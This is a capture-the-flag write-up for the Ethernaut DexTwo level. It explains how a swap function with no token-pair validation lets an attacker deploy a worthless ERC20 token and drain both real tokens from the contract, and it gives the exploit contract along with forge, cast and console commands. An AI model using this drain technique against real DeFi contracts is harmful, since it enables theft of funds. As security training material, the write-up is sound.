![](https://ethernaut.openzeppelin.com/imgs/BigLevel23.svg)

This level will ask you to break `DexTwo`, a subtlely modified `Dex` contract from the previous level, in a different way.

You need to drain all balances of token1 and token2 from the `DexTwo` contract to succeed in this level.

You will still start with 10 tokens of `token1` and 10 of `token2`. The DEX contract still starts with 100 of each token.

  Things that might help:

- How has the `swap` method been modified?

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import 'openzeppelin-contracts-08/access/Ownable.sol';

contract DexTwo is Ownable {
  address public token1;
  address public token2;
  constructor() {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }

  function add_liquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapAmount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  } 

  function getSwapAmount(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableTokenTwo is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}
```

Solution:
## Analysis

Before going forward, I would highly recommend doing the [Level 22 - Dex](https://blog.dixitaditya.com/ethernaut-level-22-dex) before this one as I won't be going over the whole contract as that has been done previously.

Let's take a look at the vulnerable function -

```sol
function swap(address from, address to, uint amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapAmount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
}
```

If we will compare the same function from the [previous level](https://blog.dixitaditya.com/ethernaut-level-22-dex), we will see that there's a line missing in this one which is -

```sol
require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
```

It is responsible for validating if the swapping is happening only for the two token addresses defined by the contract. Since this is absent from Dex Two, we are allowed to swap any tokens. Even the ones we create. This is what we have to do to drain the Dex Two.

---
## Calculations

To exploit the Dex Two, here's what we have to do:

- Create our own ERC20 token and mint ourselves (`msg.sender`) 400 ZombieTokens (ZTN) (Name of our malicious token).
- Send 100 ZTN to Dex Two so that the price ratio is balanced to 1:1 when swapping.
- Approve the Dex to spend 300 of our ZTN. We'll need this to swap 100 token1 and 200 token2. This will be clearer once we see the balance table below.
- Once all that is done, here's how the distribution of balance will be:

|Dex Two|||User|||
|---|---|---|---|---|---|
|token1|token2|ZTN|token1|token2|ZTN|
|100|100|100|10|10|300|

- Swap 100 ZTN with token1. This will drain all the token1 from the Dex Two.

|Dex Two|||User|||
|---|---|---|---|---|---|
|token1|token2|ZTN|token1|token2|ZTN|
|100|100|100|10|10|300|
|0|100|200|110|10|200|

- According to the formula in `get_swap_amount()`, to get all the token2 from the Dex, we need - `100 = (x * 100)/200` - `x = 200 ZTN`. Therefore, we need to swap 200 ZTN to get 100 token2. Once this is done, here's how the final balance table will look:

> ```
> The number of token2 to be returned = (amount of token1 to be swapped * token2 balance of the contract)/token1 balance of the contract.
> ```

|Dex Two|||User|||
|---|---|---|---|---|---|
|token1|token2|ZTN|token1|token2|ZTN|
|100|100|100|10|10|300|
|0|100|200|110|10|200|
|0|0|400|110|110|0|

Now it should be clear why we chose 400 ZTN to start with. Let's deploy our exploit code.

---
## The Exploit

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract ZombieToken is ERC20 {
    constructor(uint256 initialSupply) ERC20("ZombieToken", "ZTN") public {
        _mint(msg.sender, initialSupply);
    }
}
```

```bash
forge create ZombieToken --private-key $DGPKEY --rpc-url $G_RPC_URL --constructor-args 400
```
```bash
cast call 0x6B61042E5E8138cfC69892dCc78637f7A6f73b8A "balanceOf(address)" "0x095454F216EC9485da86D49aDffAcFD0Fa3e5BE5" --private-key $DGPKEY --rpc-url $G_RPC_URL | cast --to-dec
```
```bash
cast send 0x6B61042E5E8138cfC69892dCc78637f7A6f73b8A "transfer(address,uint256)" "0x3F03baF3B56aEC751cAd20169E1F139b83f0F0f7" "100" --private-key $DGPKEY --rpc-url $G_RPC_URL
```
```shell
cast send 0x6B61042E5E8138cfC69892dCc78637f7A6f73b8A "approve(address,uint256)" "0x3F03baF3B56aEC751cAd20169E1F139b83f0F0f7" "300" --private-key $DGPKEY --rpc-url $G_RPC_URL
```
then go to js console:
```js
token1 = await contract.token1()
token2 = await contract.token2()
ZNT = "0x6B61042E5E8138cfC69892dCc78637f7A6f73b8A"
await contract.swap(ZNT, token1, 100)
await contract.swap(ZNT, token2, 200)
```
That's all